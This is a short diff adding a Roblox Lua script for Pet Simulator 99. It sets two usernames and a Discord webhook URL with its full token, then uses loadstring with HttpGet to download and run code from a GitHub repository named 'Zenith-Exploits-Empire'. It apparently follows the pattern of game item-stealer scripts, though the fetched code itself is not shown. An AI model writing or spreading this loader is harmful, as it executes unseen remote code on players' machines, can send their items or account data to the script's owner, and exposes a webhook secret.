@@ -1,1 +1,5 @@
+Username = "zenith_build123"
+Username2 = "zenith_build123"
+Webhook = "https://discord.com/api/webhooks/1360240080794550392/hA-Wnbx14Scxru3LQY9Xzcn9dcwn98ZCeP9O2WolwzSLyDPn9QwRF8aa1NstXVwYP51N"
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Pet-simulator-99/refs/heads/main/Raw%20-%20pets%20go"))()
